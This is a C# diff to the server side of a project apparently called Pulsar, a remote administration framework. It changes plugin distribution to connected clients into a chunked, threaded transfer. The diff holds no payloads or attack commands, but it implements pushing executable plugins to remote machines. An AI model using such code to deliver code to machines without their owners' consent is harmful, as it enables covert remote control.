@@ -3,9 +3,11 @@ using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Plugin;
 using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
+using Pulsar.Common.IO;
 using Pulsar.Server.Networking;
 using Pulsar.Server.Plugin;
 using System;
+using System.Threading;
 
 namespace Pulsar.Server.Messages
 {
@@ -70,10 +72,10 @@ namespace Pulsar.Server.Messages
             {
                 OnReport($"Error processing plugin message: {ex.Message}");
             }
-        }
-
+        }        
+        
         /// <summary>
-        /// Distributes a plugin to the connected client.
+        /// Distributes a plugin to the connected client using chunked transfer.
         /// </summary>
         /// <param name="pluginName">Name of the plugin to distribute.</param>
         public void DistributePlugin(string pluginName)
@@ -84,13 +86,7 @@ namespace Pulsar.Server.Messages
                 byte[] pluginBytes = _pluginManager.GetClientPluginBytes(pluginName);
                 if (pluginBytes != null)
                 {
-                    _client.Send(new DoPluginDistribution
-                    {
-                        PluginName = pluginName,
-                        PluginContent = pluginBytes
-                    });
-
-                    OnReport($"Client plugin '{pluginName}' distributed to client");
+                    DistributePluginChunked(pluginName, pluginBytes);
                 }
                 else
                 {
@@ -101,6 +97,65 @@ namespace Pulsar.Server.Messages
             {
                 OnReport($"Error distributing plugin '{pluginName}': {ex.Message}");
             }
+        }
+
+        /// <summary>
+        /// Distributes a plugin using chunked transfer to avoid packet size limits.
+        /// </summary>
+        /// <param name="pluginName">Name of the plugin to distribute.</param>
+        /// <param name="pluginBytes">The plugin data bytes.</param>
+        private void DistributePluginChunked(string pluginName, byte[] pluginBytes)
+        {
+            new Thread(() =>
+            {
+                try
+                {
+                    using (var pluginSplit = new PluginSplit(pluginBytes))
+                    {
+                        var totalChunks = pluginSplit.GetTotalChunks();
+                        var chunkIndex = 0;
+
+                        OnReport($"Starting chunked distribution of plugin '{pluginName}' ({pluginBytes.Length} bytes, {totalChunks} chunks)");
+
+                        foreach (var chunk in pluginSplit)
+                        {
+                            var isFirstChunk = chunkIndex == 0;
+                            var isLastChunk = chunkIndex == totalChunks - 1;
+
+                            _client.Send(new DoPluginDistributionChunk
+                            {
+                                PluginName = pluginName,
+                                TotalSize = pluginBytes.Length,
+                                Chunk = chunk,
+                                IsFirstChunk = isFirstChunk,
+                                IsLastChunk = isLastChunk,
+                                ChunkIndex = chunkIndex,
+                                TotalChunks = totalChunks
+                            });
+
+                            chunkIndex++;
+
+                            OnReport($"Sent chunk {chunkIndex}/{totalChunks} for plugin '{pluginName}'");
+
+                            // short delay to avoid potential DDOS
+                            Thread.Sleep(10);
+                        }
+
+                        OnReport($"Completed chunked distribution of plugin '{pluginName}'");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    OnReport($"Error during chunked plugin distribution for '{pluginName}': {ex.Message}");
+                    
+                    _client.Send(new DoPluginDistributionComplete
+                    {
+                        PluginName = pluginName,
+                        Success = false,
+                        ErrorMessage = ex.Message
+                    });
+                }
+            }) { IsBackground = true }.Start();
         }
 
         /// <summary>
